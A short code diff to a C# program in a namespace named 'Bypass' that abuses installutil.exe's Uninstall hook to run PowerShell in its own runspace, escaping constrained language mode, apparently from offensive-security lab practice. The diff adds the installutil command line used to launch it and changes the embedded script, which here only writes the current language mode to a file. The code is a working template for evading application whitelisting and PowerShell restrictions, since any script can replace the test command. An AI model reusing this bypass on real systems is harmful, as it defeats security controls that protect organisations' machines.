@@ -1,4 +1,5 @@
 //This bypasses constrained language mode... I think?
+//Run with C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /U
 using System;
 using System.Management.Automation;
 using System.Management.Automation.Runspaces;
@@ -17,8 +18,7 @@ namespace Bypass
     {
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-        //This should let us verify what mode we are in.
-            String cmd = "$ExecutionContext.SessionState.LanguageMode > C:\\Windows\\Tasks\\mode.txt";
+            String cmd = "$ExecutionContext.SessionState.LanguageMode |Out-File -FilePath C:\\tools\\mode.txt";
             Runspace rs = RunspaceFactory.CreateRunspace();
             rs.Open();
             PowerShell ps = PowerShell.Create();
@@ -26,6 +26,7 @@ namespace Bypass
             ps.AddScript(cmd);
             ps.Invoke();
             rs.Close();
+            
         }
     }
 }
